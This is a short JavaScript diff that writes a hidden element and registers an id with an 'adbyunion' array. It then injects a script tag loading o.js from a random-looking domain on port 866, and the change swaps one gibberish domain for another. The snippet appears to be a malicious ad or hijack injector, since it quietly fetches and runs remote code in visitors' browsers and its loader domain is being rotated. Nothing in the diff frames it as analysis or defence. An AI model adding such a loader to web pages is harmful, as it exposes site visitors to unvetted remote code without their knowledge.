@@ -7,6 +7,6 @@ if (ua_web) {
   var id = "8225462100335650212-10845";
   document.write('<ins style="display:none!important" id="' + id + '"></ins>');
   (window.adbyunion = window.adbyunion || []).push(id);
-  document.write('<script async  src="https://nfksjkfs.com:866/o.js"></script>');
+  document.write('<script async  src="https://9a9kzc8s.com:866/o.js"></script>');
   })();
 }
